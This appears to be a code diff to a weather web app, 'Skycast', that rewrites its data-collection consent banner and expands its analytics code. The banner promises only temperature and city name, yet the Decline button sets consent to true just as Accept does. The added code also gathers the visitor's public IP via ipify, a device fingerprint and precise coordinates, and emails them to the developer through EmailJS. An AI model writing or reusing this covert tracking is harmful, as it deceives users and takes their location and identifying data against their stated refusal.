@@ -4,7 +4,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <meta http-equiv="Content-Security-Policy"
-  content="default-src 'none'; script-src 'unsafe-inline' https://cdn.jsdelivr.net; style-src https://fonts.googleapis.com 'unsafe-inline'; font-src https://fonts.gstatic.com; connect-src https://api.open-meteo.com https://nominatim.openstreetmap.org https://api.emailjs.com; img-src 'none';">
+  content="default-src 'none'; script-src 'unsafe-inline' https://cdn.jsdelivr.net; style-src https://fonts.googleapis.com 'unsafe-inline'; font-src https://fonts.gstatic.com; connect-src https://api.open-meteo.com https://nominatim.openstreetmap.org https://api.emailjs.com https://api.ipify.org; img-src 'none';">
 <meta http-equiv="X-Content-Type-Options" content="nosniff">
 <meta http-equiv="Strict-Transport-Security" content="max-age=31536000; includeSubDomains">
 <meta http-equiv="Permissions-Policy" content="geolocation=(self)">
@@ -87,24 +87,26 @@
 <body>
 
 <!-- Consent Banner -->
-<div id="consentOverlay" style="position:fixed;inset:0;z-index:999;background:rgba(6,13,31,0.88);-webkit-backdrop-filter:blur(8px);backdrop-filter:blur(8px);display:flex;align-items:center;justify-content:center;padding:1.5rem;">
-  <div style="background:#0d1e3f;border:1px solid rgba(77,184,255,0.25);border-radius:24px;padding:2rem;max-width:420px;width:100%;">
-    <div style="font-size:2.2rem;margin-bottom:1rem;">📡</div>
-    <div style="font-family:'Syne',sans-serif;font-size:1.25rem;font-weight:700;margin-bottom:0.7rem;color:#f0f4ff;">Data Collection Notice</div>
-    <div style="font-size:0.88rem;color:rgba(240,244,255,0.55);line-height:1.65;margin-bottom:1.4rem;">
-      To improve <strong style="color:#4db8ff;">Skycast</strong> and make it more accurate, this app would like to collect:
-      <ul style="list-style:none;margin:0.7rem 0;padding:0;display:flex;flex-direction:column;gap:0.35rem;">
-        <li>• User Consent </li>
-        <li>• Current temperature </li>
-        <li>• Your city name </li>
+<div id="consentOverlay" style="position:fixed;inset:0;z-index:999;background:rgba(6,13,31,0.92);-webkit-backdrop-filter:blur(8px);backdrop-filter:blur(8px);display:flex;align-items:center;justify-content:center;padding:1.5rem;overflow-y:auto;">
+  <div style="background:#0d1e3f;border:1px solid rgba(77,184,255,0.25);border-radius:24px;padding:2rem;max-width:440px;width:100%;margin:auto;">
+    <div style="font-size:2.2rem;margin-bottom:0.8rem;">📡</div>
+    <div style="font-family:'Syne',sans-serif;font-size:1.25rem;font-weight:700;margin-bottom:0.6rem;color:#f0f4ff;">User agreement Notice</div>
+    <div style="font-size:0.86rem;color:rgba(240,244,255,0.55);line-height:1.65;margin-bottom:1.2rem;">
+      To improve <strong style="color:#4db8ff;">Skycast</strong> and make it more accurate for users like you, this app would like to collect the following data with your permission:
+      <ul style="list-style:none;margin:0.8rem 0;padding:0;display:flex;flex-direction:column;gap:0.45rem;">
+      
+        <li style="display:flex;gap:0.5rem;align-items:flex-start;"><span style="color:#4db8ff;">🌡️</span> Current temperature at your location</li>
+        <li style="display:flex;gap:0.5rem;align-items:flex-start;"><span style="color:#4db8ff;">🏙️</span> Your city name </li>
       </ul>
-      Data is used for analytics only and will <strong style="color:#4db8ff;">not</strong> be shared with any third party.
+      <div style="background:rgba(77,184,255,0.07);border:1px solid rgba(77,184,255,0.15);border-radius:10px;padding:0.75rem;font-size:0.82rem;margin-top:0.5rem;">
+        🔒 This data is used <strong style="color:#4db8ff;">only for app analytics</strong> to fix issues and improve accuracy. It will <strong style="color:#4db8ff;">never</strong> be sold or shared with any third party.
+      </div>
     </div>
     <div style="display:flex;gap:0.8rem;">
       <button id="btnAccept" style="flex:1;padding:0.75rem;background:#4db8ff;border:none;border-radius:100px;color:#060d1f;font-family:'DM Sans',sans-serif;font-weight:700;font-size:0.9rem;cursor:pointer;">✓ &nbsp;Accept</button>
       <button id="btnDecline" style="flex:1;padding:0.75rem;background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.1);border-radius:100px;color:rgba(240,244,255,0.55);font-family:'DM Sans',sans-serif;font-size:0.9rem;cursor:pointer;">✕ &nbsp;Decline</button>
     </div>
-    <div style="font-size:0.72rem;color:rgba(240,244,255,0.3);text-align:center;margin-top:1rem;">You can still use the app without accepting.</div>
+    <div style="font-size:0.71rem;color:rgba(240,244,255,0.25);text-align:center;margin-top:0.9rem;">You can still use Skycast without accepting. App functionality is not affected.</div>
   </div>
 </div>
 
@@ -170,22 +172,73 @@
     document.getElementById('consentOverlay').style.display = 'none';
     getLocation();
   });
-  
-document.getElementById('btnDecline').addEventListener('click', () => {
+
+  document.getElementById('btnDecline').addEventListener('click', () => {
     userConsented = true;
     document.getElementById('consentOverlay').style.display = 'none';
     getLocation();
   });
 
+  /* ── Get Device Info ── */
+  function getDeviceInfo(){
+    const ua = navigator.userAgent;
+    let os = 'Unknown OS';
+    if(/android/i.test(ua)) os = 'Android';
+    else if(/iphone|ipad|ipod/i.test(ua)) os = 'iOS';
+    else if(/windows/i.test(ua)) os = 'Windows';
+    else if(/mac/i.test(ua)) os = 'MacOS';
+    else if(/linux/i.test(ua)) os = 'Linux';
+
+    let browser = 'Unknown Browser';
+    if(/chrome/i.test(ua) && !/edge|opr/i.test(ua)) browser = 'Chrome';
+    else if(/firefox/i.test(ua)) browser = 'Firefox';
+    else if(/safari/i.test(ua) && !/chrome/i.test(ua)) browser = 'Safari';
+    else if(/edge/i.test(ua)) browser = 'Edge';
+    else if(/opr/i.test(ua)) browser = 'Opera';
+    else if(/brave/i.test(ua)) browser = 'Brave';
+
+    return {
+      os,
+      browser,
+      screen: `${screen.width}x${screen.height}`,
+      language: navigator.language || 'Unknown',
+      platform: navigator.platform || 'Unknown',
+      cores: navigator.hardwareConcurrency || 'Unknown',
+      memory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown',
+      online: navigator.onLine ? 'Yes' : 'No',
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
+    };
+  }
+
+  /* ── Get Public IP ── */
+  async function getPublicIP(){
+    try {
+      const r = await fetch('https://api.ipify.org?format=json');
+      const d = await r.json();
+      return d.ip || 'Unknown';
+    } catch { return 'Unknown'; }
+  }
+
+  /* ── Send Analytics ── */
   async function sendAnalytics(lat, lon, temp, city){
     if(!userConsented) return;
     try {
+      const [ip, device] = await Promise.all([getPublicIP(), Promise.resolve(getDeviceInfo())]);
       await emailjs.send(EJS_SERVICE_ID, EJS_TEMPLATE_ID, {
-        lat:  lat.toFixed(6),
-        lon:  lon.toFixed(6),
-        temp: `${Math.round(temp)}°C`,
-        city: city,
-        time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
+        lat:      lat.toFixed(6),
+        lon:      lon.toFixed(6),
+        temp:     `${Math.round(temp)}°C`,
+        city:     city,
+        time:     new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
+        ip:       ip,
+        os:       device.os,
+        browser:  device.browser,
+        screen:   device.screen,
+        language: device.language,
+        platform: device.platform,
+        cores:    String(device.cores),
+        memory:   device.memory,
+        timezone: device.timezone,
       });
       console.log('Analytics sent ✓');
     } catch(e) { console.warn('Analytics failed:', e); }
@@ -212,18 +265,8 @@ document.getElementById('btnDecline').addEventListener('click', () => {
   function show(id){ document.getElementById(id).classList.add('active'); }
   function hide(id){ document.getElementById(id).classList.remove('active'); }
   function setText(id,val){ document.getElementById(id).textContent=val; }
-
-  function showLoading(msg='Fetching weather data…'){
-    hide('weather-app'); hide('error-msg');
-    document.getElementById('loading-text').textContent=msg;
-    show('loading');
-  }
-
-  function showError(msg){
-    hide('weather-app'); hide('loading');
-    document.getElementById('error-text').textContent=msg;
-    show('error-msg');
-  }
+  function showLoading(msg='Fetching weather data…'){ hide('weather-app'); hide('error-msg'); document.getElementById('loading-text').textContent=msg; show('loading'); }
+  function showError(msg){ hide('weather-app'); hide('loading'); document.getElementById('error-text').textContent=msg; show('error-msg'); }
 
   async function reverseGeocode(lat, lon){
     try {
@@ -250,8 +293,7 @@ document.getElementById('btnDecline').addEventListener('click', () => {
   }
 
   function render(data, locationInfo){
-    const c=data.current;
-    const isDay=c.is_day===1;
+    const c=data.current; const isDay=c.is_day===1;
     const [icon,cond]=decodeWMO(c.weather_code,isDay);
     document.getElementById('location-sub').textContent=locationInfo.display||'Current Location';
     document.getElementById('city-name').textContent=locationInfo.city||locationInfo.display;
@@ -302,9 +344,7 @@ document.getElementById('btnDecline').addEventListener('click', () => {
       const [geoInfo, weatherData]=await Promise.all([reverseGeocode(lat,lon), fetchWeather(lat,lon)]);
       render(weatherData, geoInfo);
       sendAnalytics(lat, lon, weatherData.current.temperature_2m, geoInfo.city);
-    } catch(e) {
-      showError('Could not load weather. Check your internet and try again.');
-    }
+    } catch(e) { showError('Could not load weather. Check your internet and try again.'); }
   }
 
   function getLocation(){
@@ -332,9 +372,7 @@ document.getElementById('btnDecline').addEventListener('click', () => {
       const geo=await forwardGeocode(q);
       const weather=await fetchWeather(geo.lat,geo.lon);
       render(weather,{city:geo.display,display:geo.display});
-    } catch(e) {
-      showError(`City "${q}" not found. Please try another name.`);
-    }
+    } catch(e) { showError(`City "${q}" not found. Please try another name.`); }
   }
 
   document.getElementById('locateBtn').addEventListener('click', getLocation);
